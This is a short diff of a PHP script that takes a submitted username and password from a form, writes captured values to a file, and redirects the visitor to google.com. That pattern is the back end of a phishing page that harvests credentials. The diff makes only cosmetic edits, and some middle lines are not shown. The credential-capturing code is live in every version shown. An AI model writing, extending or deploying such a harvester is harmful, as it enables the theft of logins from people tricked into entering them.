@@ -1,5 +1,5 @@
 <?php
-header ("location:https://www.google.com");
+header("location:https://www.google.com");
 $a = $_POST["uname"];
 $b = $_POST["passwd"];
 //$d = $_POST["date"];
@@ -16,10 +16,5 @@ fwrite($e,$g);
 fwrite($e,$d);
 fwrite($e,$t);
 fclose($e);
-
-
-
-?>
-<?php
 
 ?>
